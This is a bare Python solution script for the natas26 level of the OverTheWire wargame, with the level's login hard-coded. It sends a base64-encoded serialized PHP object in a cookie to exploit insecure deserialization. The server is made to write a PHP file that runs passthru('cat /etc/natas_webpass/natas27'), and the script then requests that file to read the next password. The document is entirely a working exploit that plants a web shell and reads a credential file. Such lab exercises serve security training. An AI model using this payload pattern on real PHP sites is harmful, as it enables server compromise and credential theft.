#!usr/bin/python

import requests

URL = "http://natas26.natas.labs.overthewire.org/"
USER = "natas26"
PASS = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
cookies = {"drawing": "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2hhY2tlZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MjoiPD9waHAgcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=="}

r = requests.get(URL, auth = (USER, PASS), cookies = cookies)

URL_PASS = "http://natas26.natas.labs.overthewire.org/img/hacked.php"
r = requests.get(URL_PASS, auth = (USER, PASS))

print(r.text)
